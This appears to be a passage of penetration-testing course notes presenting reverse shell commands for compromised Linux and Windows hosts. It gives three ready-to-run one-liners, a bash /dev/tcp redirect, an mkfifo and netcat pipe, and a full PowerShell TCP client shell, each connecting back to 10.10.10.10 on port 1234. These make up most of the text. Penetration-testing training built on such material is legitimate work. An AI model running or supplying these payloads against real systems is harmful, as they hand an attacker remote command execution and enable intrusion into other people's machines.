# Reverse Shell Command
The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access. The Payload All The Things page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.

Certain reverse shell commands are more reliable than others and can usually be attempted to get a reverse connection. The below commands are reliable commands we can use to get a reverse connection, for bash on Linux compromised hosts and Powershell on Windows compromised hosts:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
